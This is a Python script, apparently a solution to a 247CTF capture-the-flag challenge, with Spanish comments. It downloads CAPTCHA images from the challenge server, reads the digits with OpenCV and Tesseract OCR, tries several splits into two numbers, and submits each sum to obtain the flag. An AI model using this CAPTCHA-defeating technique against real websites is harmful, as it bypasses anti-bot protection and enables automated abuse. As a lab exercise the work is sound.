#!/usr/bin/env python3
import cv2
import numpy as np
import pytesseract
import requests
import re

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

def extract_number(session):
    """Extrae el número del CAPTCHA"""
    img_response = session.get(BASE_URL + "mturk.php")
    img_array = np.frombuffer(img_response.content, np.uint8)
    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
    
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, binary = cv2.threshold(gray, 120, 255, cv2.THRESH_BINARY)
    resized = cv2.resize(binary, None, fx=5, fy=5, interpolation=cv2.INTER_CUBIC)
    
    text = pytesseract.image_to_string(resized, config='--psm 6 -c tessedit_char_whitelist=0123456789').strip()
    return text.replace('\n', '').replace(' ', '')

# Probar con 5 CAPTCHAs diferentes
print("Analizando múltiples CAPTCHAs:")
for i in range(5):
    session = requests.Session()
    session.get(BASE_URL)
    
    number_str = extract_number(session)
    print(f"\nCAPTCHA {i+1}: '{number_str}' (longitud: {len(number_str)})")
    
    if len(number_str) > 2:
        # Probar división 6-6 o similar basado en la longitud
        mid = len(number_str) // 2
        
        # Probar algunas divisiones alrededor del punto medio
        for offset in [0, -1, 1, -2, 2]:
            split = mid + offset
            if split > 0 and split < len(number_str):
                num1 = number_str[:split]
                num2 = number_str[split:]
                
                if num1.isdigit() and num2.isdigit():
                    a = int(num1)
                    b = int(num2)
                    result = a + b
                    
                    # Enviar
                    data = {"captcha": str(result)}
                    response = session.post(BASE_URL, data=data)
                    
                    alerts = re.findall(r"alert[^>]*>([^<]+)</", response.text)
                    if alerts and "invalid" not in alerts[0].lower():
                        print(f"  ✓✓ División {split}: {a} + {b} = {result}")
                        print(f"     Respuesta: {alerts[0]}")
                        
                        if "flag" in response.text.lower() or "247ctf" in response.text.lower():
                            print("\n" + "="*60)
                            print(response.text[:1000])
                            print("="*60)
                    elif not alerts:
                        print(f"  ? División {split}: {a} + {b} = {result} (sin mensaje)")
